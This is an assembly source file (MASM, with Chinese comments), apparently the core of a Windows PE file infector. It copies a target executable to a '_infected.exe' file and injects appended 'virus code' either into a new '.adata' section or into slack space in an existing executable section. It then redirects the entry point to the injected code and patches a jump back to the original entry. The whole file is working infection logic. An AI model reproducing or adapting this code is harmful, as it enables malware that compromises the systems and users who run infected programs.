
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
		.const

szErrCreate	db	'創建文件錯誤',0dh,0ah,0
szErrNoRoom	db	'程序中沒有多餘的空間可以加入代碼!',0dh,0ah,0
szMySection	db	'.adata',0
szExt		db	'_infected.exe',0
szSuccess	db	'感染文件成功，新文件:',0dh,0ah
		db	'%s',0dh,0ah,0

		.code

include		_AddCode.asm

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 計算按照指定值對齊後的數值
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_Align		proc	_dwSize,_dwAlign

		push	edx
		mov	eax,_dwSize
		xor	edx,edx
		div	_dwAlign
		.if	edx
			inc	eax
		.endif
		mul	_dwAlign
		pop	edx
		ret

_Align		endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_ProcessPeFile	proc	_lpFile,_lpPeHead,_dwSize
		local	@szNewFile[MAX_PATH]:byte
		local	@hFile,@dwTemp,@dwEntry,@lpMemory
		local	@dwAddCodeBase,@dwAddCodeFile
		local	@szBuffer[256]:byte

		pushad
;********************************************************************
; 建立文件(1)、打開文件(2)
;********************************************************************
		invoke	lstrcpy,addr @szNewFile,addr szFileName
		invoke	lstrlen,addr @szNewFile
		lea	ecx,@szNewFile
		mov	byte ptr [ecx+eax-4],0
		invoke	lstrcat,addr @szNewFile,addr szExt
		invoke	CopyFile,addr szFileName,addr @szNewFile,FALSE

		invoke	CreateFile,addr @szNewFile,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or \
			FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
		.if	eax ==	INVALID_HANDLE_VALUE
			invoke	SetWindowText,hWinEdit,addr szErrCreate
			jmp	_Ret
		.endif
		mov	@hFile,eax
;********************************************************************
;進行一些準備工作和檢測動作
; esi --> 原PeHead，edi --> 新的PeHead
; edx --> 最後一個節表
;********************************************************************
		mov	esi,_lpPeHead
		assume	esi:ptr IMAGE_NT_HEADERS,edi:ptr IMAGE_NT_HEADERS
		invoke	GlobalAlloc,GPTR,[esi].OptionalHeader.SizeOfHeaders
		mov	@lpMemory,eax
		mov	edi,eax
		invoke	RtlMoveMemory,edi,_lpFile,[esi].OptionalHeader.SizeOfHeaders
		add	edi,esi
		sub	edi,_lpFile
		movzx	eax,[esi].FileHeader.NumberOfSections
		dec	eax
		mov	ecx,sizeof IMAGE_SECTION_HEADER
		mul	ecx

		mov	edx,edi
		add	edx,eax
		add	edx,sizeof IMAGE_NT_HEADERS
		mov	ebx,edx
		add	ebx,sizeof IMAGE_SECTION_HEADER
		assume	ebx:ptr IMAGE_SECTION_HEADER,edx:ptr IMAGE_SECTION_HEADER
;********************************************************************
; 檢查是否有空間可以新增段
;********************************************************************
		pushad
		mov	edi,ebx
		xor	eax,eax
		mov	ecx,IMAGE_SECTION_HEADER
		repz	scasb
		popad
		.if	! ZERO?
;********************************************************************
;如果木有新的節表空間的話，則查看現存代碼的最後，是否有足夠的空間 
;將病毒代碼加入代碼新節中
;********************************************************************
			xor	eax,eax
			mov	ebx,edi
			add	ebx,sizeof IMAGE_NT_HEADERS
			.while	ax <=	[esi].FileHeader.NumberOfSections
				mov	ecx,[ebx].SizeOfRawData
				.if	ecx && ([ebx].Characteristics & IMAGE_SCN_MEM_EXECUTE)
					sub	ecx,[ebx].Misc.VirtualSize
					.if	ecx > offset APPEND_CODE_END-offset APPEND_CODE
						or	[ebx].Characteristics,IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
						jmp	@F
					.endif
				.endif
				add	ebx,IMAGE_SECTION_HEADER
				inc	ax
			.endw
			invoke	CloseHandle,@hFile
			invoke	DeleteFile,addr @szNewFile
			invoke	SetWindowText,hWinEdit,addr szErrNoRoom
			jmp	_Ret
			@@:
;********************************************************************
; 如果有新的節表空間的話，加入病毒碼
;********************************************************************
			mov	eax,[ebx].VirtualAddress
			add	eax,[ebx].Misc.VirtualSize
			mov	@dwAddCodeBase,eax
			mov	eax,[ebx].PointerToRawData
			add	eax,[ebx].Misc.VirtualSize
			mov	@dwAddCodeFile,eax
			add	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
			invoke	SetFilePointer,@hFile,@dwAddCodeFile,NULL,FILE_BEGIN
			mov	ecx,offset APPEND_CODE_END-offset APPEND_CODE
			invoke	WriteFile,@hFile,offset APPEND_CODE,ecx,addr @dwTemp,NULL
		.else
;********************************************************************
; 添加新的節
;********************************************************************
			inc	[edi].FileHeader.NumberOfSections
			push	edx
			@@:
			mov	eax,[edx].PointerToRawData
;********************************************************************
;當最後一個節是為初始化數據時，PointerToRawData和SizeOfRawData等於0
; 這時應該的PointerToRawData和SizeOfRawData數據
;
;********************************************************************
			.if	! eax
				sub	edx,sizeof IMAGE_SECTION_HEADER
				jmp	@B
			.endif
			add	eax,[edx].SizeOfRawData
			pop	edx
			mov	[ebx].PointerToRawData,eax
			mov	ecx,offset APPEND_CODE_END-offset APPEND_CODE
			invoke	_Align,ecx,[esi].OptionalHeader.FileAlignment
			mov	[ebx].SizeOfRawData,eax
			invoke	_Align,ecx,[esi].OptionalHeader.SectionAlignment
			add	[edi].OptionalHeader.SizeOfCode,eax	;修正的sizeifcode
			add	[edi].OptionalHeader.SizeOfImage,eax	;修正的sizeofimage
			invoke	_Align,[edx].Misc.VirtualSize,[esi].OptionalHeader.SectionAlignment
			add	eax,[edx].VirtualAddress
			mov	[ebx].VirtualAddress,eax
			mov	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
			mov	[ebx].Characteristics,IMAGE_SCN_CNT_CODE\
				or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
			invoke	lstrcpy,addr [ebx].Name1,addr szMySection
;********************************************************************
;將新增代碼作為一個新的段，寫入文件尾部
;********************************************************************
			invoke	SetFilePointer,@hFile,[ebx].PointerToRawData,NULL,FILE_BEGIN
			invoke	WriteFile,@hFile,offset APPEND_CODE,[ebx].Misc.VirtualSize,\
				addr @dwTemp,NULL
			mov	eax,[ebx].PointerToRawData
			add	eax,[ebx].SizeOfRawData
			invoke	SetFilePointer,@hFile,eax,NULL,FILE_BEGIN
			invoke	SetEndOfFile,@hFile
;********************************************************************
			push	[ebx].VirtualAddress	;eax = 新增代碼的基地址
			pop	@dwAddCodeBase
			push	[ebx].PointerToRawData
			pop	@dwAddCodeFile
		.endif
;********************************************************************
; 把OEP指向新增區段的頭
;********************************************************************
		mov	eax,@dwAddCodeBase
		add	eax,(offset _NewEntry-offset APPEND_CODE)
		mov	[edi].OptionalHeader.AddressOfEntryPoint,eax
		invoke	SetFilePointer,@hFile,0,NULL,FILE_BEGIN
		invoke	WriteFile,@hFile,@lpMemory,[esi].OptionalHeader.SizeOfHeaders,\
			addr @dwTemp,NULL
;********************************************************************
; 修正新代碼中的jmp oldEntry  指令
;********************************************************************
		push	[esi].OptionalHeader.AddressOfEntryPoint
		pop	@dwEntry
		mov	eax,@dwAddCodeBase
		add	eax,(offset _ToOldEntry-offset APPEND_CODE+5)
		sub	@dwEntry,eax
		mov	ecx,@dwAddCodeFile
		add	ecx,(offset _dwOldEntry-offset APPEND_CODE)
		invoke	SetFilePointer,@hFile,ecx,NULL,FILE_BEGIN
		invoke	WriteFile,@hFile,addr @dwEntry,4,addr @dwTemp,NULL
;********************************************************************
; 關閉文件
;********************************************************************
		invoke	GlobalFree,@lpMemory
		invoke	CloseHandle,@hFile
		invoke	wsprintf,addr @szBuffer,Addr szSuccess,addr @szNewFile
		invoke	SetWindowText,hWinEdit,addr @szBuffer
_Ret:
		assume	esi:nothing
		popad
		ret

_ProcessPeFile	endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
